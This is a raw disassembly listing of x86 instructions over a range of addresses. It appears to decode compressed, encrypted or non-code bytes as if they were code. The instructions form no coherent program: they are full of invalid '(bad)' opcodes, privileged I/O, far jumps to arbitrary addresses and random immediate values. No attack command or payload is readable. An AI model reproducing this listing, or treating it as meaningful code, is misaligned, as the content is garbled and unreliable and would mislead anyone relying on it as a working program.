  42d074:	sub    BYTE PTR [ecx-0x1],bh
  42d077:	dec    esi
  42d078:	arpl   WORD PTR [esi-0x17],si
  42d07b:	sahf   
  42d07c:	retf   
  42d07d:	scas   al,BYTE PTR es:[edi]
  42d07e:	and    DWORD PTR [ebx],esi
  42d080:	inc    eax
  42d081:	lahf   
  42d082:	or     dl,cl
  42d084:	mov    BYTE PTR [edx+0x18],dl
  42d087:	fnsave [eax-0x54298c]
  42d08d:	shl    DWORD PTR [eax],1
  42d08f:	rcr    BYTE PTR [esi],0x0
	...
  42d0f2:	add    BYTE PTR [eax],al
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [esi+0x65],bh
  42d102:	push   ds
  42d103:	aad    0x18
  42d105:	jecxz  0x42d108
  42d107:	add    BYTE PTR ds:0x6000001,al
  42d10d:	nop
  42d10e:	cmp    cl,BYTE PTR [edi-0x4f2f33a0]
  42d114:	sub    eax,ebp
  42d116:	dec    esi
  42d117:	retf   
  42d118:	retf   0x6d5f
  42d11b:	loope  0x42d0c1
  42d11d:	ds jno 0x42d197
  42d120:	add    esi,DWORD PTR [edi-0x1d]
  42d123:	pusha  
  42d124:	pop    esi
  42d125:	inc    esi
  42d126:	xor    al,0xd9
  42d128:	mov    al,ds:0x87d18b60
  42d12d:	std    
  42d12e:	jbe    0x42d116
  42d130:	push   edi
  42d131:	add    BYTE PTR [ecx+ecx*4-0x6708c867],bl
  42d138:	xchg   ecx,eax
  42d139:	cmc    
  42d13a:	(bad)  
  42d13b:	outs   dx,DWORD PTR ds:[esi]
  42d13c:	jb     0x42d11f
  42d13e:	aam    0xb
  42d140:	call   0xca63682b
  42d145:	dec    ebx
  42d146:	int    0xad
  42d148:	fbld   TBYTE PTR [edx]
  42d14a:	call   0xa7036f0c
  42d14f:	sahf   
  42d150:	into   
  42d151:	sahf   
  42d152:	and    eax,0x593a8bdf
  42d157:	int    0x4d
  42d159:	lds    ebp,FWORD PTR [ecx+ecx*2]
  42d15c:	push   ecx
  42d15d:	mov    cl,0x49
  42d15f:	add    eax,0x985fb4e5
  42d164:	dec    ebx
  42d165:	pushf  
  42d166:	jge    0x42d149
  42d168:	jg     0x42d1b7
  42d16a:	jne    0x42d14f
  42d16c:	adc    esi,DWORD PTR [eax-0x7c]
  42d16f:	inc    edi
  42d170:	jnp    0x42d117
  42d172:	push   ss
  42d173:	and    al,0x3
  42d175:	xchg   ecx,eax
  42d176:	pusha  
  42d177:	aam    0x2b
  42d179:	push   0x6d9eea9e
  42d17e:	dec    esp
  42d17f:	aam    0xc
  42d181:	(bad)  
  42d183:	cmp    BYTE PTR [edi+0x3e],ah
  42d186:	xor    eax,0x1d62c7d8
  42d18b:	push   es
  42d18c:	rcl    ah,0x2a
  42d18f:	imul   ah
  42d191:	leave  
  42d192:	in     eax,dx
  42d193:	cld    
  42d194:	shl    BYTE PTR [ebx-0x62c68b65],1
  42d19a:	shr    BYTE PTR [edx],0xed
  42d19d:	ror    edx,cl
  42d19f:	sbb    al,0xbf
  42d1a1:	inc    edi
  42d1a2:	inc    esi
  42d1a3:	mov    edx,0xabbcd60a
  42d1a8:	mov    DWORD PTR [esi],ecx
  42d1aa:	adc    ecx,edi
  42d1ac:	imul   esi,DWORD PTR [ecx-0x6a],0x9f7a83a6
  42d1b3:	(bad)  
  42d1b4:	cmp    al,0x75
  42d1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1b7:	sub    ebx,DWORD PTR [esi]
  42d1b9:	fisubr DWORD PTR ds:0x145c519b
  42d1bf:	fstp   TBYTE PTR [esi+0x3345e540]
  42d1c5:	(bad)  
  42d1c6:	push   edi
  42d1c7:	add    al,0xa5
  42d1c9:	xchg   ebx,eax
  42d1ca:	test   DWORD PTR [edx+0x1d],0x6f635b9d
  42d1d1:	push   ss
  42d1d2:	xchg   esp,eax
  42d1d3:	dec    esp
  42d1d4:	in     al,0x1c
  42d1d6:	mov    ecx,0x254dce28
  42d1db:	data16 (bad) 
  42d1dd:	pop    edi
  42d1de:	dec    edx
  42d1df:	sbb    cl,BYTE PTR [eax+0x45c3e3b2]
  42d1e5:	jo     0x42d210
  42d1e7:	sbb    DWORD PTR [ebx+ebx*8-0x70],ebp
  42d1eb:	jo     0x42d220
  42d1ed:	xlat   BYTE PTR ds:[ebx]
  42d1ee:	push   0x9d008d7
  42d1f3:	int3   
  42d1f4:	fisttp WORD PTR [eax]
  42d1f6:	sbb    al,0x93
  42d1f8:	or     bh,BYTE PTR [ebp+0x1f8ba219]
  42d1fe:	mov    WORD PTR [ecx],ds
  42d200:	loope  0x42d1c3
  42d202:	test   BYTE PTR [esi-0x41d73b6],bh
  42d208:	pop    edi
  42d209:	nop
  42d20a:	dec    esi
  42d20b:	jno    0x42d25a
  42d20d:	cmp    DWORD PTR [ebx+ecx*1+0x73],ebp
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d229
  42d281:	add    eax,0xe41dc901
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    eax,0xc2000001
  42d28d:	rol    ebp,1
  42d28f:	mov    esi,0xc0c952aa
  42d294:	sbb    BYTE PTR [ecx-0x386c06d9],dh
  42d29a:	nop
  42d29b:	pop    ebp
  42d29c:	mov    edi,DWORD PTR [edx+eiz*8]
  42d29f:	nop
  42d2a0:	sbb    BYTE PTR [edi-0x7f37b2ec],bl
  42d2a6:	fstp   TBYTE PTR [eax-0x51]
  42d2a9:	push   ss
  42d2aa:	sbb    DWORD PTR ds:0xb188282f,0x5c
  42d2b1:	cdq    
  42d2b2:	jno    0x42d318
  42d2b4:	xchg   ecx,eax
  42d2b5:	jl     0x42d270
  42d2b7:	push   edx
  42d2b8:	and    eax,esi
  42d2ba:	push   ecx
  42d2bb:	push   es
  42d2bc:	imul   eax,DWORD PTR [ebx+0x4f9781b8],0x2793fc6
  42d2c6:	mov    BYTE PTR [ecx+ecx*1+0x23],ch
  42d2ca:	out    0x6c,al
  42d2cc:	push   cs
  42d2cd:	hlt    
  42d2ce:	or     esp,edi
  42d2d0:	bound  edi,QWORD PTR [edi+0x4fec2d56]
  42d2d6:	icebp  
  42d2d7:	mov    esp,0x33faf409
  42d2dc:	cwde   
  42d2dd:	fdiv   st(5),st
  42d2df:	rcr    DWORD PTR [eax],0x3d
  42d2e2:	scas   al,BYTE PTR es:[edi]
  42d2e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2e4:	sbb    eax,0xaf821d1
  42d2e9:	and    eax,0xec4baf17
  42d2ee:	loopne 0x42d327
  42d2f0:	stos   BYTE PTR es:[edi],al
  42d2f1:	int3   
  42d2f2:	std    
  42d2f3:	gs xchg ecx,eax
  42d2f5:	int3   
  42d2f6:	mov    edx,0x252fe0c1
  42d2fb:	push   0xffffffe6
  42d2fd:	adc    eax,0x84d61c57
  42d302:	inc    esp
  42d303:	out    0x18,eax
  42d305:	sub    dh,dl
  42d307:	xor    esp,eax
  42d309:	jg     0x42d2c8
  42d30b:	ss push edx
  42d30d:	mov    edx,0xec8f39a4
  42d312:	adc    dh,BYTE PTR [edx]
  42d314:	fdiv   st(7),st
  42d316:	adc    bh,BYTE PTR [ecx-0x9bd56a1]
  42d31c:	cli    
  42d31d:	sub    al,0xf9
  42d31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d320:	dec    edi
  42d321:	jbe    0x42d39e
  42d323:	inc    ecx
  42d324:	and    eax,0x1ab21cba
  42d329:	sbb    eax,0x9924d545
  42d32e:	add    eax,0x476dc333
  42d333:	ret    0x527e
  42d336:	cli    
  42d337:	and    eax,0x97646c5e
  42d33c:	cmp    cl,BYTE PTR [edx+0x5d]
  42d33f:	gs ret 0x6b6
  42d343:	cwde   
  42d344:	pop    es
  42d345:	xchg   ebx,eax
  42d346:	inc    edx
  42d347:	or     esi,edx
  42d349:	popf   
  42d34a:	sbb    eax,0x74e95951
  42d34f:	mov    bl,0xd4
  42d351:	dec    ebp
  42d352:	sbb    al,0x97
  42d354:	clc    
  42d355:	add    al,0x63
  42d357:	jmp    0xea504d40
  42d35c:	pop    ebp
  42d35d:	dec    esi
  42d35e:	mov    esp,0xefd74717
  42d363:	test   al,0xf
  42d365:	sbb    BYTE PTR [esi-0x42],bl
  42d368:	xchg   ebx,eax
  42d369:	jb     0x42d317
  42d36b:	mov    WORD PTR [edi+esi*2],cs
  42d36e:	nop
  42d36f:	jmp    FWORD PTR [ebp+0x5e]
  42d372:	push   ds
  42d373:	mov    al,ds:0x61d7c69c
  42d378:	or     eax,0xdb620734
  42d37d:	mov    BYTE PTR [ecx],cl
  42d37f:	mov    cl,ah
  42d381:	adc    DWORD PTR [esi],ebp
  42d383:	push   esi
  42d384:	pop    ss
  42d385:	pop    esp
  42d386:	fwait
  42d387:	xor    al,BYTE PTR [ecx-0x2b]
  42d38a:	mov    eax,esp
  42d38c:	in     al,0xd5
  42d38e:	pop    ss
  42d38f:	and    edi,0x0
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	inc    ecx
  42d401:	pop    esp
  42d402:	shl    DWORD PTR [edx+0x22],cl
  42d405:	in     eax,0x1
  42d407:	add    BYTE PTR ds:0x58000001,al
  42d40d:	fadd   DWORD PTR [esi]
  42d40f:	add    ch,cl
  42d411:	(bad)  [edi-0x17]
  42d414:	out    dx,eax
  42d415:	jecxz  0x42d45e
  42d417:	push   ds
  42d418:	add    eax,0x8f24c250
  42d41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d41e:	xor    eax,DWORD PTR ds:0x9385ad8b
  42d424:	dec    ebx
  42d425:	pop    esi
  42d426:	dec    esp
  42d427:	ret    0xf136
  42d42a:	sub    BYTE PTR [edx],bh
  42d42c:	rcl    cl,1
  42d42e:	sbb    DWORD PTR [edi+eiz*2+0xe624397],edx
  42d435:	push   ebx
  42d436:	repz jp 0x42d4ab
  42d439:	dec    eax
  42d43a:	sub    ch,al
  42d43c:	cmp    bl,BYTE PTR [edi-0x6e]
  42d43f:	aam    0x76
  42d441:	arpl   WORD PTR [edi+0x648f9ad4],sp
  42d447:	out    dx,al
  42d448:	popf   
  42d449:	add    eax,DWORD PTR [ecx+0x28]
  42d44c:	lea    edi,[edi-0x447b22e9]
  42d452:	mov    dl,0xfd
  42d454:	xlat   BYTE PTR ds:[ebx]
  42d455:	mov    ?,WORD PTR [ebp-0x34]
  42d458:	add    eax,0xc658eb15
  42d45d:	mov    dh,0x7
  42d45f:	cmp    esp,DWORD PTR [ecx]
  42d461:	and    BYTE PTR [edi],cl
  42d463:	inc    eax
  42d464:	or     bh,BYTE PTR [esi-0x3]
  42d467:	push   edi
  42d468:	mov    ebp,DWORD PTR [ebx+0x33]
  42d46b:	ret    
  42d46c:	loopne 0x42d45c
  42d46e:	lock popa 
  42d470:	(bad)  
  42d471:	jle    0x42d423
  42d473:	pop    edi
  42d474:	pop    esi
  42d475:	or     DWORD PTR [ecx+eiz*4],0xe6dd5e2
  42d47c:	aas    
  42d47d:	shl    eax,cl
  42d47f:	fisub  DWORD PTR [ebp-0x23120c25]
  42d485:	aam    0x40
  42d487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d488:	leave  
  42d489:	lds    ecx,FWORD PTR [esp+eiz*4]
  42d48c:	mov    al,0x5d
  42d48e:	out    dx,al
  42d48f:	jg     0x42d4e2
  42d491:	je     0x42d500
  42d493:	cmp    DWORD PTR [ecx],0xffffffb1
  42d496:	add    al,0x92
  42d498:	ins    DWORD PTR es:[edi],dx
  42d499:	sub    BYTE PTR [ecx+0x7f],bh
  42d49c:	div    BYTE PTR [eax]
  42d49e:	fcomp  QWORD PTR [ecx]
  42d4a0:	jae    0x42d4a6
  42d4a2:	jno    0x42d4b3
  42d4a4:	ja     0x42d51d
  42d4a6:	xor    eax,0x6f5a6d29
  42d4ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4ac:	xor    al,0x9f
  42d4ae:	adc    cl,bl
  42d4b0:	sti    
  42d4b1:	xor    edi,DWORD PTR [ecx-0x12]
  42d4b4:	sar    BYTE PTR [ecx+0x1f],cl
  42d4b7:	xchg   esi,eax
  42d4b8:	(bad)  
  42d4b9:	dec    eax
  42d4ba:	inc    ebp
  42d4bb:	jo     0x42d523
  42d4bd:	pop    edx
  42d4be:	lods   al,BYTE PTR ds:[esi]
  42d4bf:	stc    
  42d4c0:	sti    
  42d4c1:	shl    DWORD PTR [edi+0x3c664e7a],0x22
  42d4c8:	dec    ecx
  42d4c9:	push   esi
  42d4ca:	leave  
  42d4cb:	or     DWORD PTR [esi-0x4],0x1f1c55dc
  42d4d2:	pusha  
  42d4d3:	pop    es
  42d4d4:	mov    dh,0xa1
  42d4d6:	sub    BYTE PTR [ebx+0x7f21afb1],al
  42d4dc:	jno    0x42d552
  42d4de:	popa   
  42d4df:	push   ebx
  42d4e0:	push   ebx
  42d4e1:	adc    ah,BYTE PTR [ebx+edi*8]
  42d4e4:	mov    esp,0xb05e8543
  42d4e9:	sub    eax,0x848f8d5f
  42d4ee:	inc    ebp
  42d4ef:	jb     0x42d510
  42d4f1:	xchg   dl,bh
  42d4f3:	sbb    al,0xba
  42d4f5:	lds    ebp,FWORD PTR [edi-0x161f3eab]
  42d4fb:	ret    0x7ae4
  42d4fe:	sbb    dl,BYTE PTR [ebp-0x641a9170]
  42d504:	mov    esp,0xaa7e5523
  42d509:	add    BYTE PTR [edi-0x5f],dl
  42d50c:	sub    ecx,DWORD PTR [esi+0x12]
  42d50f:	cmp    al,0xd1
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xce28e0d5,eax
  42d583:	test   DWORD PTR [edi],esp
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x8e000001,al
  42d58d:	inc    edx
  42d58e:	jmp    0x42d57b
  42d590:	and    cl,BYTE PTR [edx-0x3b]
  42d593:	ret    0x6930
  42d596:	test   DWORD PTR [ebx-0x5cc171bd],esi
  42d59c:	shr    DWORD PTR [esp+ecx*2+0x2263195d],1
  42d5a3:	jle    0x42d574
  42d5a5:	push   ds
  42d5a6:	dec    esi
  42d5a7:	pop    esi
  42d5a8:	push   ebp
  42d5a9:	sub    al,0x6
  42d5ab:	add    dl,BYTE PTR [edx+esi*1+0x42628672]
  42d5b2:	bound  ebx,QWORD PTR [ebp+0x31]
  42d5b5:	cmp    DWORD PTR [esi-0x5ce67c51],eax
  42d5bb:	ss pushf 
  42d5bd:	ins    DWORD PTR es:[edi],dx
  42d5be:	pop    edx
  42d5bf:	xor    DWORD PTR [eax],ebp
  42d5c1:	sar    DWORD PTR [edx+edx*2+0x20f96572],0x77
  42d5c9:	sbb    DWORD PTR [ecx-0x76d9dc7e],edi
  42d5cf:	std    
  42d5d0:	and    al,0x4c
  42d5d2:	ins    BYTE PTR es:[edi],dx
  42d5d3:	fild   DWORD PTR [edi]
  42d5d5:	mov    al,ds:0x28fb5c22
  42d5da:	in     al,0xb8
  42d5dc:	pop    ds
  42d5dd:	jns    0x42d563
  42d5df:	(bad)  [esi+0xe]
  42d5e2:	xchg   edx,eax
  42d5e3:	ins    BYTE PTR es:[edi],dx
  42d5e4:	sub    ch,dl
  42d5e6:	pop    esi
  42d5e7:	daa    
  42d5e8:	cmp    BYTE PTR [eax-0x42],0x6
  42d5ec:	(bad)  
  42d5ed:	or     ah,BYTE PTR [edx-0x3f85e475]
  42d5f3:	cld    
  42d5f4:	int    0xb7
  42d5f6:	or     BYTE PTR [ebp-0x46],ah
  42d5f9:	adc    BYTE PTR [edi],al
  42d5fb:	inc    ecx
  42d5fc:	outs   dx,DWORD PTR ds:[esi]
  42d5fd:	xor    ch,al
  42d5ff:	and    al,0xb3
  42d601:	lds    edi,FWORD PTR [edi-0x18]
  42d604:	pusha  
  42d605:	dec    ecx
  42d606:	test   al,0x4
  42d608:	mov    ebp,0xc20c6f6b
  42d60d:	mov    bl,cl
  42d60f:	mov    ds:0xe36d9e7b,al
  42d614:	mov    ss,ecx
  42d616:	aad    0x5d
  42d618:	mov    cl,0xc
  42d61a:	sub    DWORD PTR [edx-0x13],eax
  42d61d:	sbb    al,0x2f
  42d61f:	push   0x5e
  42d621:	inc    WORD PTR [ebx+0x59ff90d]
  42d628:	rcr    DWORD PTR [esi+edi*1+0x7d],0x20
  42d62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d62e:	(bad)  [eax+0x7c]
  42d631:	sub    BYTE PTR [eax],bh
  42d633:	ja     0x42d65c
  42d635:	cdq    
  42d636:	inc    eax
  42d637:	jmp    0x42d69f
  42d639:	add    eax,0x278ef591
  42d63e:	jge    0x42d65f
  42d640:	add    eax,0x7ffc166a
  42d645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d646:	das    
  42d647:	cmp    DWORD PTR [esi+eiz*4+0x5c],0xffffffcf
  42d64c:	aam    0x71
  42d64e:	inc    ebx
  42d64f:	xor    bl,al
  42d651:	sbb    eax,0x6ffae9db
  42d656:	adc    ebp,DWORD PTR [ebx]
  42d658:	test   ah,ch
  42d65a:	and    BYTE PTR [ecx-0x4b],cl
  42d65d:	sub    DWORD PTR [esi+0x48],esp
  42d660:	inc    ecx
  42d661:	sbb    eax,0xa6336300
  42d666:	in     al,0x9e
  42d668:	or     dl,BYTE PTR [edi+edi*1+0x55a55bc]
  42d66f:	cmc    
  42d670:	jle    0x42d670
  42d672:	fadd   QWORD PTR [ebx+eiz*8-0x75]
  42d676:	ror    DWORD PTR [edx],0x46
  42d679:	cmp    ah,BYTE PTR [ebx]
  42d67b:	sahf   
  42d67c:	jb     0x42d6b6
  42d67e:	repz mov esp,cs
  42d681:	test   DWORD PTR [edx-0x4db1f549],esi
  42d687:	adc    al,0x84
  42d689:	cmp    al,0x8f
  42d68b:	ret    
  42d68c:	psubusw mm5,QWORD PTR [eax]
  42d68f:	(bad)  
  42d690:	jb     0x42d692
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xb3
  42d701:	xchg   esp,eax
  42d702:	pop    ebx
  42d703:	sub    eax,0x1e72c
  42d708:	add    eax,0x29000001
  42d70d:	retf   0x7400
  42d710:	inc    ebx
  42d711:	into   
  42d712:	mov    esp,0x60a13ce
  42d717:	mov    eax,DWORD PTR [ecx+0xe715301]
  42d71d:	or     edi,DWORD PTR [ebp-0x7e]
  42d720:	dec    ebx
  42d721:	mov    ebx,0xf06f4a8e
  42d726:	shl    DWORD PTR [edi+0x6483ac8a],cl
  42d72c:	nop
  42d72d:	addr16 mov bh,0x86
  42d730:	mov    ds,WORD PTR [ecx]
  42d732:	inc    esi
  42d733:	mov    dl,0x5d
  42d735:	jae    0x42d72f
  42d737:	xchg   esi,eax
  42d738:	pop    eax
  42d739:	dec    edi
  42d73a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d73b:	jmp    0x42d77e
  42d73d:	call   0xc608:0x1ec055fa
  42d744:	mov    ds:0xffce9dd,al
  42d749:	adc    eax,esi
  42d74b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d74c:	mov    ah,0xb4
  42d74e:	xor    DWORD PTR [edi+0xbb3b841],ecx
  42d754:	call   0x13e1:0xf7cee029
  42d75b:	sar    BYTE PTR [eax],0x91
  42d75e:	dec    esi
  42d75f:	sbb    DWORD PTR [ecx+edi*2],eax
  42d762:	lahf   
  42d763:	mov    ebx,0x28893c26
  42d768:	cmp    ebx,0xffffffe5
  42d76b:	cli    
  42d76c:	xchg   ebx,eax
  42d76d:	repnz mov dh,0x1
  42d770:	sbb    DWORD PTR [ebp-0x3fd11148],esp
  42d776:	neg    BYTE PTR [eax]
  42d778:	jmpw   0x9bac
  42d77c:	mov    ds:0x40d4b337,al
  42d781:	push   ebx
  42d782:	enter  0x4897,0xc7
  42d786:	xchg   ecx,eax
  42d787:	pop    ss
  42d788:	pop    ss
  42d789:	mov    dh,0x76
  42d78b:	lock cs ret 0x1341
  42d790:	pop    ebp
  42d791:	mov    esp,0xa0d9cb71
  42d796:	jl     0x42d7c5
  42d798:	dec    eax
  42d799:	repz jae 0x42d73c
  42d79c:	and    al,BYTE PTR [edx+edx*8-0x37f4f3a7]
  42d7a3:	fs scas al,BYTE PTR es:[edi]
  42d7a5:	jnp    0x42d73b
  42d7a7:	push   ecx
  42d7a8:	cmp    dh,al
  42d7aa:	pop    ebp
  42d7ab:	jne    0x42d7d0
  42d7ad:	dec    ecx
  42d7ae:	aam    0xed
  42d7b0:	sbb    BYTE PTR [ebx+edx*8-0x63],ah
  42d7b4:	in     eax,0xa2
  42d7b6:	stos   BYTE PTR es:[edi],al
  42d7b7:	neg    ch
  42d7b9:	or     DWORD PTR [eax+0x2ed3f799],edi
  42d7bf:	bound  ebp,QWORD PTR [esi+eax*2-0x6a]
  42d7c3:	iret   
  42d7c4:	and    ebx,DWORD PTR ds:0xbc4a2805
  42d7ca:	das    
  42d7cb:	xchg   ebp,eax
  42d7cc:	sbb    eax,ecx
  42d7ce:	es inc edi
  42d7d0:	xchg   edx,eax
  42d7d1:	pop    esp
  42d7d2:	push   edi
  42d7d3:	mov    ebx,0xdc081b71
  42d7d8:	pop    DWORD PTR [ebx-0x1e]
  42d7db:	add    edi,DWORD PTR [ebp-0x3940e8e6]
  42d7e1:	sti    
  42d7e2:	imul   eax,edx,0x4aaa1839
  42d7e8:	inc    ecx
  42d7ea:	dec    edx
  42d7eb:	imul   ecx,DWORD PTR ss:[ebx],0x364a768
  42d7f2:	(bad)  
  42d7f3:	dec    ebp
  42d7f4:	mov    ebx,0x44b75299
  42d7f9:	inc    ebp
  42d7fa:	xchg   BYTE PTR [eax+0x89ad5e4],bl
  42d800:	push   esi
  42d801:	inc    ebx
  42d802:	rol    BYTE PTR [eax+0x5d],cl
  42d805:	scas   al,BYTE PTR es:[edi]
  42d806:	sub    eax,0xeb41c762
  42d80b:	jnp    0x42d79e
  42d80d:	mov    edx,0xd895c3
	...
  42d872:	add    BYTE PTR [eax],al
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x4bc6961a
  42d881:	es sub al,al
  42d884:	xor    eax,ebp
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0xf0000001
  42d88d:	dec    ebp
  42d88e:	push   0xe4ac8a6d
  42d893:	fwait
  42d894:	mov    esp,0x22033a94
  42d899:	loope  0x42d882
  42d89b:	xchg   esi,eax
  42d89c:	clc    
  42d89d:	and    DWORD PTR [ebp-0x4a],eax
  42d8a0:	dec    edx
  42d8a1:	xchg   edi,eax
  42d8a2:	and    eax,0xd8eb4eb1
  42d8a7:	repz adc DWORD PTR [ebx+0x6098d5c2],ebp
  42d8ae:	rcl    dh,cl
  42d8b0:	pop    ds
  42d8b1:	mov    al,ds:0xbd177e8
  42d8b6:	call   0x6962b8cf
  42d8bb:	pop    edx
  42d8bc:	mov    al,0x95
  42d8be:	pop    ecx
  42d8bf:	push   0xffffffb0
  42d8c1:	jmp    FWORD PTR [ebx+ebp*2+0x74]
  42d8c5:	mov    BYTE PTR [edx-0x224605fc],ah
  42d8cb:	cwde   
  42d8cc:	push   edi
  42d8cd:	cwde   
  42d8ce:	pop    ss
  42d8cf:	cdq    
  42d8d0:	cmp    eax,0x6274810a
  42d8d5:	xor    esi,DWORD PTR [eax+ebp*2]
  42d8d8:	pop    esi
  42d8d9:	sbb    ah,cl
  42d8db:	pop    es
  42d8dc:	mov    eax,ds:0x2ca928e9
  42d8e1:	lea    ebp,[ecx-0x6510fc10]
  42d8e7:	push   edi
  42d8e8:	daa    
  42d8e9:	mov    esp,DWORD PTR [esi]
  42d8eb:	in     eax,0xf3
  42d8ed:	or     BYTE PTR [esp+ebx*1+0x8ee4549],al
  42d8f4:	xor    dl,al
  42d8f6:	sar    BYTE PTR [esi],cl
  42d8f8:	(bad)  
  42d8f9:	aam    0x3c
  42d8fb:	pop    eax
  42d8fc:	mov    cl,0xd4
  42d8fe:	rcl    DWORD PTR [eax-0x48bbc40f],1
  42d904:	clc    
  42d905:	push   ecx
  42d906:	ret    
  42d907:	(bad)  
  42d908:	dec    ebp
  42d909:	or     ecx,DWORD PTR [ebx-0x4146fc60]
  42d90f:	fucompp 
  42d911:	dec    esp
  42d912:	lea    ebp,[ecx]
  42d914:	cmc    
  42d915:	add    dh,bh
  42d917:	js     0x42d912
  42d919:	mov    ds:0x6738212b,eax
  42d91e:	ret    
  42d91f:	fsubr  st,st(3)
  42d921:	rol    bl,0x55
  42d924:	sti    
  42d925:	sbb    DWORD PTR [ebp+0x61],edx
  42d928:	jae    0x42d900
  42d92a:	mov    esi,0xb678b2f7
  42d92f:	mov    dh,0xd4
  42d931:	repz repnz push edi
  42d934:	ror    BYTE PTR [eax+0x16d52b7],1
  42d93a:	in     eax,dx
  42d93b:	cmp    BYTE PTR [eax+0x78],0x1c
  42d93f:	test   BYTE PTR [ebx],0x3b
  42d942:	sub    DWORD PTR ds:0x96270ac,ebp
  42d948:	clc    
  42d949:	push   es
  42d94a:	popf   
  42d94b:	lods   eax,DWORD PTR ds:[esi]
  42d94c:	add    BYTE PTR [eax],al
  42d94e:	dec    edi
  42d94f:	data16 into 
  42d951:	dec    eax
  42d952:	push   edi
  42d953:	(bad)  
  42d954:	push   esi
  42d955:	push   eax
  42d956:	and    DWORD PTR ds:[edi],0xffffffc8
  42d95a:	leave  
  42d95b:	jg     0x42d9db
  42d95d:	cli    
  42d95e:	add    BYTE PTR [ebx],0xcf
  42d961:	cmp    al,0x78
  42d963:	dec    edi
  42d964:	and    eax,0x896cbdfa
  42d969:	mov    ebp,edx
  42d96b:	loopne 0x42d91b
  42d96d:	or     al,0xad
  42d96f:	rcr    DWORD PTR [edi+0x3c],0x47
  42d973:	add    cl,BYTE PTR [edx+edx*2]
  42d976:	sbb    ah,BYTE PTR [edx-0xc]
  42d979:	addr16 xchg ebx,eax
  42d97b:	ret    0x5ecf
  42d97e:	cs push 0xe9e0f345
  42d984:	cmp    eax,0x7ff32b78
  42d989:	pop    edi
  42d98a:	or     bh,BYTE PTR [esi-0x6446cb58]
  42d990:	adc    eax,0x0
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	aad    0xd0
  42da02:	xor    BYTE PTR [edi],ch
  42da04:	ss jmp 0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	inc    ebp
  42da0d:	sbb    ecx,DWORD PTR [eax-0x35]
  42da10:	push   edx
  42da11:	inc    ebp
  42da12:	cmp    al,0x76
  42da14:	sbb    eax,esp
  42da16:	pop    edi
  42da17:	push   0xffffffb0
  42da19:	sbb    DWORD PTR [edx+0x2c],esp
  42da1c:	mov    esi,0xf6bf2f16
  42da21:	or     cl,BYTE PTR [eax-0xdfceec2]
  42da27:	ins    BYTE PTR es:[edi],dx
  42da28:	add    BYTE PTR [eax],ah
  42da2a:	in     eax,dx
  42da2b:	outs   dx,DWORD PTR ds:[esi]
  42da2c:	cmp    ebx,esi
  42da2e:	mov    ebp,0x28890540
  42da33:	mov    ebp,0x4702dd55
  42da38:	fcom   QWORD PTR [esi+0x30]
  42da3b:	pusha  
  42da3c:	xchg   esi,eax
  42da3d:	add    DWORD PTR [edi],esi
  42da3f:	jp     0x42da01
  42da41:	fsubr  st,st(1)
  42da43:	or     DWORD PTR [edx+0x4f15792d],edi
  42da49:	xchg   esp,eax
  42da4a:	scas   al,BYTE PTR es:[edi]
  42da4b:	push   ebx
  42da4c:	(bad)  
  42da4d:	xchg   ebx,eax
  42da4e:	int    0x81
  42da50:	xchg   esi,eax
  42da51:	ret    0x5b26
  42da54:	ss ins DWORD PTR es:[edi],dx
  42da56:	xor    al,0xea
  42da58:	bound  edx,QWORD PTR [edx+0x29]
  42da5b:	in     al,dx
  42da5c:	mov    esp,0xc1c1bee5
  42da61:	adc    eax,0xa46f11cd
  42da66:	ror    bh,0xb7
  42da69:	xor    ch,cl
  42da6b:	xor    eax,0x2a7ae917
  42da70:	mov    eax,0x12310d27
  42da75:	mov    esi,0xd98477d2
  42da7a:	mov    edx,0xee2482a5
  42da7f:	repz and esp,0xa260e55b
  42da86:	sub    al,0x24
  42da88:	int3   
  42da89:	dec    ebp
  42da8a:	mov    BYTE PTR [esi-0x5c19b804],al
  42da90:	inc    ebp
  42da91:	inc    esi
  42da92:	mov    ebx,0xbcd48acc
  42da97:	push   0xffffff82
